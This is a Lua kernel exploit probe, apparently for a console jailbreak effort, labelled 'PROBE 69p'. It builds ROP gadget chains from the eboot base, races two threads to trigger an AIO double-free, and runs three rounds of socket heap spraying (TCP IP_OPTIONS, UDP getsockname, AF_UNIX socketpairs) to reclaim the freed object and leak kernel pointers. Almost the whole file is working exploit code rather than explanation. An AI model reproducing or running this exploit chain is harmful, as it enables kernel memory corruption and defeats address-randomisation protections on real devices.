-- CRASH_CLASS: MODERATE
-- PROBE 69p: Socketpair + setsockopt spray to reclaim R-object after double-free
--
-- R-object (48B, 64B UMA bucket) freed by AIO double-free contains:
--   R+0x00 = curthread+0x390 (kernel thread pointer, NOT zeroed)
--   R+0x08 = curthread+0x08  (kernel thread pointer, NOT zeroed)
--
-- Strategy: after double-free, spray with setsockopt(IP_OPTIONS) which
-- allocates a 40-byte kernel buffer in the mbuf zone. If that zone
-- overlaps with the R-object's 64B bucket, we can read back the kernel
-- pointers via getsockopt(IP_OPTIONS).
--
-- Also tests: setsockopt(SO_LINGER) writes inline 8B into the socket
-- struct itself, and sendmsg ancillary data (SCM_CREDS) which allocates
-- control message buffers.

print("=== PROBE 69p: SOCKETPAIR + SETSOCKOPT SPRAY RECLAIM ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(p + #s, 0) end)
    return p
end
local function is_kptr(val)
    if val == nil then return false end
    local h, l = get_hi_lo(val)
    if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then return true end
    return false
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- Ignore SIGSYS/SIGBUS/SIGPIPE
local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa, uint64(0)) end)

local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("/dev/zero fd=" .. fd_zero)

local ib = memory.alloc(0x200); wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_pop_rdx = eb + 0x3B02D7
local g_bare_ret = eb + 0x42

-- AIO helpers
local BATCH = 16
local reqs = memory.alloc(0x30)
local data_buf = memory.alloc(0x1000)
local one_id = memory.alloc(8)
local one_st = memory.alloc(8)

local function submit_one()
    wq(N(reqs), uint64(0))
    wq(N(reqs) + 8, uint64(16))
    local bh, bl = get_hi_lo(uint64(N(data_buf)))
    wd(N(reqs) + 0x10, bl); wd(N(reqs) + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(one_id)))
    wd(N(reqs) + 0x18, rl); wd(N(reqs) + 0x1C, rh)
    wd(N(reqs) + 0x20, fd_zero); wd(N(reqs) + 0x24, 0)
    wd(N(one_id), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(one_id)))
    end)
    return rd(N(one_id)) or 0
end

local function poll_one(id)
    wd(N(one_id), id); wd(N(one_st), 0xDEAD)
    pcall(function()
        mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
    return rd(N(one_st)) or 0xDEAD
end

local function build_delete_child(del_ids_addr, count, states_addr)
    local stk = memory.alloc(0x4000)
    local sb = N(stk)
    local rsp = sb + 0x2000 - ((sb + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb + i, 0) end
    local off = 0
    local function emit(v) wq(rsp + off, v); off = off + 8 end
    emit(g_pop_rdi); emit(uint64(del_ids_addr))
    emit(g_pop_rsi); emit(uint64(count))
    emit(g_pop_rdx); emit(uint64(states_addr))
    emit(g_pop_rax); emit(uint64(662))
    emit(stub)
    emit(g_pop_rdi); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(431))
    emit(stub)
    local par = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par) + i, 0) end
    wq(N(par), g_bare_ret)
    wq(N(par) + 0x10, uint64(sb))
    wq(N(par) + 0x18, uint64(0x2000))
    local tid = memory.alloc(8); wq(N(tid), uint64(0))
    wq(N(par) + 0x30, tid)
    return par
end

local del_ids = memory.alloc(4 * BATCH + 0x10)
local states_A = memory.alloc(4 * BATCH + 0x10)
local states_B = memory.alloc(4 * BATCH + 0x10)
local sv_buf = memory.alloc(16)

-- ============================================================
-- [A] Double-free + IP_OPTIONS spray + getsockopt readback
-- ============================================================
print("")
print("[A] Double-free -> TCP socket spray -> IP_OPTIONS setsockopt -> getsockopt readback")

local ITERS = 15
local SPRAY = 100
local total_kptrs = 0

for iter = 1, ITERS do
    if not alive() then print("  DEAD at iter " .. iter); break end

    -- Submit + poll
    local ids = {}
    for i = 1, BATCH do
        local id = submit_one()
        if id ~= 0 then poll_one(id); table.insert(ids, id) end
    end
    if #ids < 8 then
        print(string.format("  iter %d: only %d IDs, skip", iter, #ids))
        break
    end

    -- Prepare concurrent delete
    for i = 0, #ids - 1 do
        wd(N(del_ids) + i * 4, ids[i + 1])
        wd(N(states_A) + i * 4, 0xAAAAAAAA)
        wd(N(states_B) + i * 4, 0xBBBBBBBB)
    end

    -- Fire double-free
    local par_A = build_delete_child(N(del_ids), #ids, N(states_A))
    local par_B = build_delete_child(N(del_ids), #ids, N(states_B))
    pcall(function() mk(455)(par_A, uint64(0x38)) end)
    pcall(function() mk(455)(par_B, uint64(0x38)) end)
    for w = 1, 40000 do local _ = rd(N(del_ids)) end

    local doubles = 0
    for i = 0, #ids - 1 do
        local sA = rd(N(states_A) + i * 4) or 0xAAAAAAAA
        local sB = rd(N(states_B) + i * 4) or 0xBBBBBBBB
        if sA == 0 and sB == 0 then doubles = doubles + 1 end
    end

    if not alive() then
        print(string.format("  iter %d: CRASHED (doubles=%d)", iter, doubles))
        break
    end

    if doubles == 0 then
        print(string.format("  iter %d: 0 doubles, skip", iter))
    else
        print(string.format("  iter %d: %d doubles -> spraying %d TCP sockets",
            iter, doubles, SPRAY))

        -- Spray: create TCP sockets and set IP_OPTIONS (40 bytes)
        local spray_fds = {}
        local opt_buf = memory.alloc(48)
        for i = 0, 39 do
            pcall(function() memory.write_byte(N(opt_buf) + i, 0x01) end)
        end

        for i = 1, SPRAY do
            local fd = nil
            pcall(function()
                fd = mk(97)(uint64(2), uint64(1), uint64(6))
            end)
            if fd then
                local fv = sgn(fd)
                if fv >= 0 then
                    table.insert(spray_fds, fv)
                    pcall(function()
                        mk(105)(uint64(fv), uint64(0), uint64(1),
                            uint64(N(opt_buf)), uint64(40))
                    end)
                end
            end
        end

        -- Read back IP_OPTIONS via getsockopt
        local read_buf = memory.alloc(64)
        local read_len = memory.alloc(8)
        local iter_kptrs = 0

        for _, fv in ipairs(spray_fds) do
            for i = 0, 15 do wd(N(read_buf) + i * 4, 0xDEADDEAD) end
            wd(N(read_len), 44)
            pcall(function()
                mk(118)(uint64(fv), uint64(0), uint64(1),
                    uint64(N(read_buf)), uint64(N(read_len)))
            end)
            local got_len = rd(N(read_len)) or 0
            if got_len > 0 then
                for off = 0, got_len - 4, 4 do
                    local lo = rd(N(read_buf) + off) or 0
                    local hi_off = off + 4
                    if hi_off < got_len then
                        local hi = rd(N(read_buf) + hi_off) or 0
                        if hi >= 0xFFFF8000 and hi ~= 0xFFFFFFFF then
                            local qv = rq(uint64(string.format("0x%X", N(read_buf) + off)))
                            print(string.format("  *** KERNEL PTR @ fd=%d off=%d: %s",
                                fv, off, fmt(qv)))
                            iter_kptrs = iter_kptrs + 1
                            total_kptrs = total_kptrs + 1
                        end
                    end
                end
            end
        end

        if iter_kptrs > 0 then
            print(string.format("  *** iter %d: %d KERNEL POINTERS FOUND", iter, iter_kptrs))
        end

        -- Close spray sockets
        for _, fv in ipairs(spray_fds) do
            pcall(function() mk(6)(uint64(fv)) end)
        end
    end
end

if not alive() then print("DEAD after section A"); return end
print(string.format("  Section A total kernel pointers: %d", total_kptrs))

-- ============================================================
-- [B] Double-free + UDP socket spray + getsockname readback
-- ============================================================
print("")
print("[B] Double-free -> UDP socket spray -> getsockname/getpeername readback")

local total_kptrs_b = 0

for iter = 1, 10 do
    if not alive() then print("  DEAD at iter " .. iter); break end

    local ids = {}
    for i = 1, BATCH do
        local id = submit_one()
        if id ~= 0 then poll_one(id); table.insert(ids, id) end
    end
    if #ids < 8 then break end

    for i = 0, #ids - 1 do
        wd(N(del_ids) + i * 4, ids[i + 1])
        wd(N(states_A) + i * 4, 0xAAAAAAAA)
        wd(N(states_B) + i * 4, 0xBBBBBBBB)
    end

    local par_A = build_delete_child(N(del_ids), #ids, N(states_A))
    local par_B = build_delete_child(N(del_ids), #ids, N(states_B))
    pcall(function() mk(455)(par_A, uint64(0x38)) end)
    pcall(function() mk(455)(par_B, uint64(0x38)) end)
    for w = 1, 40000 do local _ = rd(N(del_ids)) end

    local doubles = 0
    for i = 0, #ids - 1 do
        local sA = rd(N(states_A) + i * 4) or 0xAAAAAAAA
        local sB = rd(N(states_B) + i * 4) or 0xBBBBBBBB
        if sA == 0 and sB == 0 then doubles = doubles + 1 end
    end

    if not alive() then break end
    if doubles == 0 then
        print(string.format("  iter %d: 0 doubles", iter))
    else
        print(string.format("  iter %d: %d doubles -> spraying UDP sockets", iter, doubles))

        local spray_fds = {}
        for i = 1, 100 do
            local fd = nil
            pcall(function()
                fd = mk(97)(uint64(2), uint64(2), uint64(17))
            end)
            if fd then
                local fv = sgn(fd)
                if fv >= 0 then
                    table.insert(spray_fds, fv)
                    -- Bind to unique port to force sockaddr allocation
                    local bind_addr = memory.alloc(16)
                    wd(N(bind_addr), 0x00020000 + 1024 + i)
                    wd(N(bind_addr) + 4, 0)
                    wd(N(bind_addr) + 8, 0)
                    wd(N(bind_addr) + 12, 0)
                    pcall(function()
                        mk(104)(uint64(fv), uint64(N(bind_addr)), uint64(16))
                    end)
                end
            end
        end

        -- getsockname readback
        local name_buf = memory.alloc(128)
        local name_len = memory.alloc(8)
        local iter_kptrs = 0

        for _, fv in ipairs(spray_fds) do
            for i = 0, 31 do wd(N(name_buf) + i * 4, 0xDEADDEAD) end
            wd(N(name_len), 128)
            pcall(function()
                mk(32)(uint64(fv), uint64(N(name_buf)), uint64(N(name_len)))
            end)
            local got_len = rd(N(name_len)) or 0
            if got_len > 16 then
                for off = 0, got_len - 8, 4 do
                    local hi = rd(N(name_buf) + off + 4) or 0
                    if hi >= 0xFFFF8000 and hi ~= 0xFFFFFFFF then
                        local qv = rq(uint64(string.format("0x%X", N(name_buf) + off)))
                        print(string.format("  *** KERNEL PTR @ fd=%d off=%d: %s",
                            fv, off, fmt(qv)))
                        iter_kptrs = iter_kptrs + 1
                        total_kptrs_b = total_kptrs_b + 1
                    end
                end
            end
        end

        for _, fv in ipairs(spray_fds) do
            pcall(function() mk(6)(uint64(fv)) end)
        end

        if iter_kptrs > 0 then
            print(string.format("  *** iter %d: %d KERNEL POINTERS", iter, iter_kptrs))
        end
    end
end

print(string.format("  Section B total kernel pointers: %d", total_kptrs_b))

-- ============================================================
-- [C] Double-free + setsockopt(SO_SNDBUF/SO_RCVBUF) tuning
-- ============================================================
print("")
print("[C] Double-free -> socket spray with sized SO_SNDBUF")

local total_kptrs_c = 0

for iter = 1, 10 do
    if not alive() then print("  DEAD at iter " .. iter); break end

    local ids = {}
    for i = 1, BATCH do
        local id = submit_one()
        if id ~= 0 then poll_one(id); table.insert(ids, id) end
    end
    if #ids < 8 then break end

    for i = 0, #ids - 1 do
        wd(N(del_ids) + i * 4, ids[i + 1])
        wd(N(states_A) + i * 4, 0xAAAAAAAA)
        wd(N(states_B) + i * 4, 0xBBBBBBBB)
    end

    local par_A = build_delete_child(N(del_ids), #ids, N(states_A))
    local par_B = build_delete_child(N(del_ids), #ids, N(states_B))
    pcall(function() mk(455)(par_A, uint64(0x38)) end)
    pcall(function() mk(455)(par_B, uint64(0x38)) end)
    for w = 1, 40000 do local _ = rd(N(del_ids)) end

    local doubles = 0
    for i = 0, #ids - 1 do
        local sA = rd(N(states_A) + i * 4) or 0xAAAAAAAA
        local sB = rd(N(states_B) + i * 4) or 0xBBBBBBBB
        if sA == 0 and sB == 0 then doubles = doubles + 1 end
    end

    if not alive() then break end
    if doubles == 0 then
        print(string.format("  iter %d: 0 doubles", iter))
    else
        print(string.format("  iter %d: %d doubles -> spraying AF_UNIX socketpairs", iter, doubles))

        local spray_pairs = {}
        for i = 1, 64 do
            wd(N(sv_buf), 0xFFFFFFFF); wd(N(sv_buf) + 4, 0xFFFFFFFF)
            pcall(function()
                mk(135)(uint64(1), uint64(1), uint64(0), uint64(N(sv_buf)))
            end)
            local f0 = rd(N(sv_buf)) or 0xFFFFFFFF
            local f1 = rd(N(sv_buf) + 4) or 0xFFFFFFFF
            if f0 ~= 0xFFFFFFFF and f1 ~= 0xFFFFFFFF then
                table.insert(spray_pairs, {f0, f1})
                -- Write 48 bytes of sentinel data to each socket
                local msg = memory.alloc(64)
                for j = 0, 11 do
                    wd(N(msg) + j * 4, 0xCAFE0000 + i * 256 + j)
                end
                pcall(function()
                    mk(4)(uint64(f0), uint64(N(msg)), uint64(48), uint64(0))
                end)
            end
        end

        -- Read back from each socket
        local rd_buf = memory.alloc(64)
        local iter_kptrs = 0

        for _, pair in ipairs(spray_pairs) do
            for i = 0, 15 do wd(N(rd_buf) + i * 4, 0xBEEFBEEF) end
            pcall(function()
                mk(3)(uint64(pair[2]), uint64(N(rd_buf)), uint64(64), uint64(0x40))
            end)
            for off = 0, 56, 4 do
                local hi = rd(N(rd_buf) + off + 4) or 0
                if hi >= 0xFFFF8000 and hi ~= 0xFFFFFFFF then
                    local qv = rq(uint64(string.format("0x%X", N(rd_buf) + off)))
                    print(string.format("  *** KERNEL PTR @ off=%d: %s", off, fmt(qv)))
                    iter_kptrs = iter_kptrs + 1
                    total_kptrs_c = total_kptrs_c + 1
                end
            end
        end

        for _, pair in ipairs(spray_pairs) do
            pcall(function() mk(6)(uint64(pair[1])) end)
            pcall(function() mk(6)(uint64(pair[2])) end)
        end

        if iter_kptrs > 0 then
            print(string.format("  *** iter %d: %d KERNEL POINTERS", iter, iter_kptrs))
        end
    end
end

print(string.format("  Section C total kernel pointers: %d", total_kptrs_c))

-- ============================================================
-- SUMMARY
-- ============================================================
print("")
print("=== SUMMARY ===")
print(string.format("TCP IP_OPTIONS spray:    %d kernel pointers", total_kptrs))
print(string.format("UDP getsockname spray:   %d kernel pointers", total_kptrs_b))
print(string.format("AF_UNIX socketpair spray:%d kernel pointers", total_kptrs_c))
print("")
print("=== PROBE 69p COMPLETE ===")
